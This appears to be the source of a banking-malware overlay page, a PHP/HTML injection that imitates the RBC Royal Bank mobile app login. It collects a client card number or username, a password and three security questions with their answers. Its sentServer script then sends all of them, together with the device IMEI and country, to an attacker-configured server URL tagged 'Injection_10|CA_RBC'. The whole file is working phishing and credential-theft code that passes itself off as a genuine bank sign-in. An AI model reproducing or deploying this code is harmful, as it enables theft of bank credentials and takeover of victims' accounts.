<html>
<head>
	<link rel="stylesheet" href="ca/com.rbc.mobile.android/css/style.css">
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/cat.style.css">
	<script src="js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<center>
<img src="ca/com.rbc.mobile.android/img/logo.jfif" style="width: 100%;">
<br><br>
		<form id="form">
		<div id="form1">
			<input name="Client Card or Username" id="login" placeholder="Client Card or Username" maxlength="16" class="input" type="email"><br><br>
			<input name="Password" id="password" placeholder="Password"  class="input" type="password"><br><br><br><br><br>

<input type="button" class="submit" id="input_submitBtn" value="SIGN IN"/>
</div>


<div id="form2" style="display: none;">
	<h3 style="color: #fff;"> Security questions </h3>
	
		<select data-mini="true" name="questions1" id="selects1" class="selects"> 
			<option value=""> Select question </option>
			<option value="What was the first movie I ever saw?"> What was the first movie I ever saw? </option>
			<option value="What is the middle name of my oldest child?"> What is the middle name of my oldest child? </option>
			<option value="In which city was my father born?"> In which city was my father born? </option>
			<option value="Who was my favourite cartoon character as a child?"> Who was my favourite cartoon character as a child? </option>
			<option value="What is my mother's middle name?"> What is my mother's middle name? </option>
			<option value="In what year did I meet my signficant other?"> In what year did I meet my signficant other? </option>
			<option value="What was my first pet's name?"> What was my first pet's name? </option>
			<option value="First name of the maid of honour at my wedding?"> First name of the maid of honour at my wedding? </option>
			<option value="First name of my best in elementart school?"> First name of my best in elementart school? </option>
			<option value="Name of my all-time favourite movie character?"> Name of my all-time favourite movie character? </option>

		</select>
		
		<input id="answers1" class="input" type="text" onkeyup="check();">
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects2" class="selects"> 
			<option value=""> Select question </option>
			<option value="What was the first movie I ever saw?"> What was the first movie I ever saw? </option>
			<option value="What is the middle name of my oldest child?"> What is the middle name of my oldest child? </option>
			<option value="In which city was my father born?"> In which city was my father born? </option>
			<option value="Who was my favourite cartoon character as a child?"> Who was my favourite cartoon character as a child? </option>
			<option value="What is my mother's middle name?"> What is my mother's middle name? </option>
			<option value="In what year did I meet my signficant other?"> In what year did I meet my signficant other? </option>
			<option value="What was my first pet's name?"> What was my first pet's name? </option>
			<option value="First name of the maid of honour at my wedding?"> First name of the maid of honour at my wedding? </option>
			<option value="First name of my best in elementart school?"> First name of my best in elementart school? </option>
			<option value="Name of my all-time favourite movie character?"> Name of my all-time favourite movie character? </option>

		</select>
		
		<input id="answers2" class="input" type="text" onkeyup="check();">
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects3" class="selects"> 
			<option value=""> Select question </option>
			<option value="What was the first movie I ever saw?"> What was the first movie I ever saw? </option>
			<option value="What is the middle name of my oldest child?"> What is the middle name of my oldest child? </option>
			<option value="In which city was my father born?"> In which city was my father born? </option>
			<option value="Who was my favourite cartoon character as a child?"> Who was my favourite cartoon character as a child? </option>
			<option value="What is my mother's middle name?"> What is my mother's middle name? </option>
			<option value="In what year did I meet my signficant other?"> In what year did I meet my signficant other? </option>
			<option value="What was my first pet's name?"> What was my first pet's name? </option>
			<option value="First name of the maid of honour at my wedding?"> First name of the maid of honour at my wedding? </option>
			<option value="First name of my best in elementart school?"> First name of my best in elementart school? </option>
			<option value="Name of my all-time favourite movie character?"> Name of my all-time favourite movie character? </option>

		</select>
		
		<input id="answers3" class="input" type="text" onkeyup="check();">
<br>
	<br>
	<br>
		<input type="button" onClick="sentServer();" class="submit" disabled="disabled" id="input_submitBtn2" value="Sign In"/>
</div>

<script>
function check() {
  var inp1 = document.getElementById('answers1'),
      inp2 = document.getElementById('answers2'),
      inp3 = document.getElementById('answers3');
  document.getElementById('input_submitBtn2').disabled = inp1.value && inp2.value && inp3.value ? false : "disabled";
}
</script>
</center>
	</form>
	
</center>

</div>
<script type="text/javascript">
				function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

 var step1 = document.getElementById('form1'),
     step2 = document.getElementById('form2'),
	 spinner = document.getElementById('spinner');


                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (!/^\w{16,16}$/i.test(oNumInp.value)) {
							try{
                                oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 6) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
					
					__hide(step1);
                    __show(step2);
                   
                    return false;
                };
				
            </script>

<script>
function sentServer()
{
var login1 = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["password"].value; 
var question1 = document.forms["form"].elements["selects1"].value; 
var answer1 = document.forms["form"].elements["answers1"].value; 
var question2 = document.forms["form"].elements["selects2"].value; 
var answer2 = document.forms["form"].elements["answers2"].value; 
var question3 = document.forms["form"].elements["selects3"].value; 
var answer3 = document.forms["form"].elements["answers3"].value; 


	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';


location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|CA_RBC|Client Card or Username: "+login1+"//br//Password: "+pass+"//br//question1: "+question1+"//br//answer1: "+answer1+"//br//question2: "+question2+"//br//answer2: "+answer2+"//br//question3: "+question3+"//br//answer3: "+answer3);
}
</script>
</body>
</html>
